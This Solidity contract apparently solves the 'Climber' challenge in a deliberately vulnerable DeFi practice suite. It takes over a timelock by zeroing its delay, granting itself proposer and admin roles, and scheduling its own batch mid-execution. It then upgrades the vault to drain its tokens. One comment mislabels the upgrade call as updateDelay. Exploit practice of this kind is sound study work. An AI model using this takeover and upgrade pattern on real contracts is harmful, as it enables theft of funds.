pragma solidity =0.8.25;

import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {UpgradedClimberVault} from "./UpgradedClimberVault.sol";

contract ExploitContract {
    ClimberVault public immutable vault;
    ClimberTimelock public immutable timelock;
    address public immutable token;
    address public immutable recovery;

    constructor(ClimberVault _vault, ClimberTimelock _timelock, address _token, address _recovery) {
        vault = _vault;
        timelock = _timelock;
        token = _token;
        recovery = _recovery;
    }

    function run() payable public {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        bytes32 salt = bytes32("");

        // timelock.updateDelay(0)
        targets[0] = address(timelock);
        dataElements[0] = abi.encodeCall(timelock.updateDelay, 0);

        // timelock.grantRole(PROPOSER_ROLE, address(exploit))
        targets[1] = address(timelock);
        dataElements[1] = abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(this)));

        // timelock.grantRole(ADMIN_ROLE, address(exploit))
        targets[2] = address(timelock);
        dataElements[2] = abi.encodeCall(timelock.grantRole, (ADMIN_ROLE, address(this)));

        // exploit.run()
        targets[3] = address(this);
        dataElements[3] = abi.encodeCall(this.run, ());

        timelock.schedule(targets, values, dataElements, salt);

        step2(token);
    }

    function step2(address token) payable public {
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory dataElements = new bytes[](1);
        bytes32 salt = bytes32("");

        UpgradedClimberVault newVault = new UpgradedClimberVault();

        // timelock.updateDelay(0)
        targets[0] = address(vault);
        dataElements[0] = abi.encodeCall(vault.upgradeToAndCall, (
            address(newVault),
            abi.encodeCall(newVault.run, (token, recovery))
        ));

        timelock.schedule(targets, values, dataElements, salt);
        timelock.execute(targets, values, dataElements, salt);
    }
}
